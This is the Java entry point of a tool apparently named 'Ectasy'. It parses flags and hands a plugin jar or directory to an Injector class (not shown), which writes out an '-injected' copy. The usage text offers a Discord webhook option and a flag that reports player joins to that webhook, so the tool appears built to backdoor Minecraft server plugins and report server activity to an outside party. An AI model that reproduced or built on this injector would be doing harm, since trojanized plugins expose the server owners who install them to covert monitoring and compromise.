package fr.bodyalhoha.ectasy;

import fr.bodyalhoha.ectasy.utils.Injector;
import fr.bodyalhoha.ectasy.utils.JarLoader;
import fr.bodyalhoha.ectasy.utils.OptionsParser;
import fr.bodyalhoha.gui.EctasyGUI;
import jdk.internal.org.objectweb.asm.Opcodes;
import org.objectweb.asm.tree.*;

import java.io.File;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;

public class Main {

    // List of accepted flags
    public static String[] has =  new String[]{"i", "input", "o", "output", "webhook"};
    // List of accepted boolean flags
    public static String[] bools = new String[]{"nogui", "logjoins"};

    /**
     * Prints the usage information for a flag
     * @param name the name of the flag
     * @param desc a description of the flag
     * @param example an example of how to use the flag
     */
    public static void printUsage(String name, String desc, String example){

        int space = 15 - name.length();

        System.out.println(" --" + name + new String(new char[space]).replace("\0", " ") + desc + " (ex : " + example + ")");
    }

    public static void main(String[] args){

        // Parse and interpret the command line arguments
        OptionsParser parser = new OptionsParser(args, has, bools);

        // If the nogui flag is not present, create an instance of the EctasyGUI class and return
        if(!parser.getBool("nogui")){
            new EctasyGUI();
            return;
        }

        // Attempt to parse the input flag
        String input = parser.get("input", "i");

        // If the input flag is not found, print usage information and return
        if(input == null){
            // Print usage information
            System.out.println("***** USAGE *****");
            printUsage("input", "The jar or directory to inject", "java -jar --input HD.jar");
            printUsage("output", "The output jar or directory", "java -jar --input HD.jar --output HD-injected.jar");
            printUsage("webhook", "Discord webhook", "java -jar --input HD.jar --webhook <link>");
            printUsage("logjoins", "Logs to webhook when a player join the server", "java -jar --input HD.jar --webhook <link> --logjoins");
            System.out.println("****************");

            return;
        }

        // Create a File object representing the input file or directory
        File inputFile = new File(input);

        // If the input file or directory does not exist, print an error message and return
        if(!inputFile.exists()){
            System.out.println("Error : " + input + " not found.");
            return;
        }

        // If the input file is a directory, call the injectDirectory() method of the Injector class
        if(inputFile.isDirectory()){
            Injector.injectDirectory(inputFile, parser.getDefault("output", "output"), parser);
            return;

        }

        // If the input file is not a directory, parse the output flag and set the default output file name
        String output = parser.getDefault(input.substring(0, input.length() - 4) + "-injected.jar", "o", "output");

        // Call the inject() method of the Injector class to inject the input file
        Injector.inject(input, output, parser);

    }
}
